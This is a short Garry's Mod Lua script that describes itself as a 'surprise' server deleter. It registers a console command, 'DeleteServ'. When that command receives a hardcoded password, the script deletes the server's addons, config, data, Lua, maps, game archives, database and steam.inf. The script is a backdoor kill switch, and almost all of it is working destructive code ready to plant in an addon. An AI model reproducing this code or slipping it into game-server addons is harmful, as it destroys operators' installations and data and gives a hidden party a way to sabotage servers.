--[[
    (C) 2014 TeslaCloud Studios Ltd.
	The code is made by TheGarry =D (Founder of TeslaCloud Studios)
	
	A SURPRISE-MOTHERFUCKER styled server deleter >:D
--]]

require("fileio")
AddCSLuaFile()

function DeleteServer(player, command, args)
    if ( args[1] == "17432" ) then
		fileio.Delete("addons")
		fileio.Delete("bin")
		fileio.Delete("cfg")
		fileio.Delete("data")
		fileio.Delete("download")
		fileio.Delete("fallbacks")
		fileio.Delete("gamemodes")
		fileio.Delete("html")
		fileio.Delete("logs")
		fileio.Delete("lua")
		fileio.Delete("maps")
		fileio.Delete("materials")
		fileio.Delete("models")
		fileio.Delete("media")
		fileio.Delete("particles")
		fileio.Delete("resource")
		fileio.Delete("scenes")
		fileio.Delete("settings")
		fileio.Delete("sound")
		fileio.Delete("fallbacks_000.vpk")
		fileio.Delete("fallbacks_dir.vpk")
		fileio.Delete("garrysmod_000.vpk")
		fileio.Delete("garrysmod_001.vpk")
		fileio.Delete("garrysmod_002.vpk")
		fileio.Delete("garrysmod_dir.vpk")
		fileio.Delete("sv.db")
		fileio.Delete("steam.inf")
		
		if CLIENT then
			print("[lalka] Pass is correct")
		end
	else
		if CLIENT then
			print("[lalka] Pass is incorrect")
		end
	end
end

--Add the concommand line
concommand.Add("DeleteServ", DeleteServer)